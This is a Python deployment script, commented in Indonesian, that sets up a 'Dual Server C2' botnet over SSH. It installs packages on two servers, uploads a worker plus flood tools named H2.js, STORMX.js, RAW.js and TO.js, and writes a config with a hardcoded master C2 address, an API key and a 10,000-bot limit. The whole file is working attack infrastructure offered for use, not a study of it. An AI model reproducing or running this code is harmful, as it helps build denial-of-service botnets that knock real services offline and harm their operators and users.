#!/usr/bin/env python3
import json
import paramiko
import os
import time

def deploy_to_server(server_ip, port, username, password, server_name):
    """Deploy ke server tujuan"""
    print(f"\n[•] Deploying to {server_name} ({server_ip})...")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(server_ip, port=port, username=username, password=password, timeout=10)
        
        # Install dependencies
        commands = [
            "apt-get update -y",
            "apt-get install -y python3-pip nodejs npm screen git",
            "pip3 install flask requests paramiko psutil",
            "npm install -g axios http2 net",
            "mkdir -p /root/c2/tools",
            "mkdir -p /root/c2/logs",
            "mkdir -p /tmp/bots"
        ]
        
        for cmd in commands:
            print(f"  Running: {cmd}")
            stdin, stdout, stderr = ssh.exec_command(cmd)
            stdout.channel.recv_exit_status()
        
        # Upload worker.py
        sftp = ssh.open_sftp()
        
        # Upload worker.py dengan konfigurasi yang sesuai
        with open('tools/worker.py', 'r') as f:
            worker_content = f.read()
        
        # Sesuaikan konfigurasi
        worker_content = worker_content.replace('{{SERVER_NAME}}', server_name)
        worker_content = worker_content.replace('{{SERVER_IP}}', server_ip)
        
        with sftp.open('/root/c2/worker.py', 'w') as f:
            f.write(worker_content)
        
        # Upload tools
        tools = ['H2.js', 'proxy.js', 'TO.js', 'STORMX.js', 'RAW.js']
        for tool in tools:
            if os.path.exists(f'tools/{tool}'):
                print(f"  Uploading {tool}...")
                with open(f'tools/{tool}', 'r') as f:
                    tool_content = f.read()
                with sftp.open(f'/root/c2/tools/{tool}', 'w') as tf:
                    tf.write(tool_content)
        
        sftp.close()
        
        # Buat config
        config_content = f'''{{
    "worker_name": "{server_name}",
    "worker_ip": "{server_ip}",
    "worker_port": 5001,
    "master_ip": "139.59.99.245",
    "master_port": 5000,
    "api_key": "GoodL7-K3y-2024-S3cr3t",
    "max_bots": 10000
}}'''
        
        stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/config.json << 'EOF'\n{config_content}\nEOF")
        
        # Jalankan worker
        ssh.exec_command("cd /root/c2 && screen -dmS worker python3 worker.py")
        
        print(f"  [✓] Deployment to {server_name} complete!")
        ssh.close()
        return True
        
    except Exception as e:
        print(f"  [✗] Error: {e}")
        return False

def main():
    # Load config
    with open('config.json', 'r') as f:
        config = json.load(f)
    
    print("""
    ╔══════════════════════════════════════════════╗
    ║     Auto Deploy Tool - Dual Server C2        ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Deploy ke server1
    server1 = config['server1']
    success1 = deploy_to_server(
        server1['ip'],
        server1['port'],
        server1['username'],
        server1['password'],
        'server1'
    )
    
    time.sleep(2)
    
    # Deploy ke server2
    server2 = config['server2']
    success2 = deploy_to_server(
        server2['ip'],
        server2['port'],
        server2['username'],
        server2['password'],
        'server2'
    )
    
    print("\n" + "="*50)
    print("DEPLOYMENT SUMMARY:")
    print(f"Server1: {'[✓] SUCCESS' if success1 else '[✗] FAILED'}")
    print(f"Server2: {'[✓] SUCCESS' if success2 else '[✗] FAILED'}")
    
    if success1 and success2:
        print("\n[✓] Kedua server berhasil dideploy!")
        print("[•] Jalankan 'python3 index.py' untuk memulai C2")

if __name__ == "__main__":
    main()